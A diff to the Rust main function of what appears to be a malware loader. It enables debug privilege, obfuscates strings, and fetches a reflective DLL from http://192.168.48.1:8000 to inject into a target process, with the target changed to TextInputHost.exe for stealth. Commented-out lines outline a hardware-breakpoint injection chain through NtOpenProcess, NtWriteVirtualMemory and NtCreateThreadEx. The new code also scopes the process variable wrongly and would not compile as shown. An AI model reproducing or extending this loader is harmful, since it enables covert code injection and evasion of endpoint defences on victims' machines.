@@ -89,20 +89,30 @@ fn main() -> Result<(), anyhow::Error>{
 
     nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
 
-    if let Err(enabled_debug_privilege) = reconnaissance::enable_debug_privilege()
-    {
-        debug_eprintln!("[WARNING] Enable Debug Priv failed\n{:#}", enabled_debug_privilege);
-    }
-    else {
-        debug_println!("[INFO] Enabled Debug Priv");
-    }
+    let enabled_debug_privilege = match reconnaissance::enable_debug_privilege() {
+        Ok(_) => {
+            debug_println!("[INFO] Enabled Debug Priv");
+            true
+        }
+        Err(e) => {
+            debug_eprintln!("[WARNING] Enable Debug Priv failed\n{:#}", e);
+            false
+        }
+    };
 
 
-
-    // let obfused_url = obfuse!("http://192.168.48.1:8000/MCHELP.dll");
     let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
     let url = obfused_url.as_str();
-    let obfused_process = obfuse!("notepad.exe");
+
+
+    if enabled_debug_privilege {
+        let obfused_process = obfuse!("TextInputHost.exe");
+    }
+    else {
+        let obfused_process = obfuse!("notepad.exe");
+    }
+
+
     // let obfused_process = obfuse!("typora.exe");
     let process = obfused_process.as_str();
 
@@ -140,10 +150,12 @@ fn main() -> Result<(), anyhow::Error>{
 
     // unsafe {
     //     let _ = hwbp::hwbp_init().expect("[ERROR] hwbp_init failed!");
+
     //     let obfused_ntopenprocess = obfuse!("NtOpenProcess\0");
     //     let obfused_ntallocatevirtualmemory = obfuse!("NtAllocateVirtualMemory\0");
     //     let obfused_ntwritevirtualmemory = obfuse!("NtWriteVirtualMemory\0");
     //     let obfused_ntcreatethreadex = obfuse!("NtCreateThreadEx\0");
+
     //     let obfused_str_ntopenprocess = obfused_ntopenprocess.as_str();
     //     let obfused_str_ntallocatevirtualmemory = obfused_ntallocatevirtualmemory.as_str();
     //     let obfused_str_ntwritevirtualmemory = obfused_ntwritevirtualmemory.as_str();
@@ -173,9 +185,6 @@ fn main() -> Result<(), anyhow::Error>{
     //     let _ = hwbp::hwbp_cleanup().expect("[ERROR] hwbp cleanup failed!");
     // }
 
-    for _i in 1..=3 {
-        thread::sleep(Duration::from_secs(1));
-    }
     
     Ok(())
 
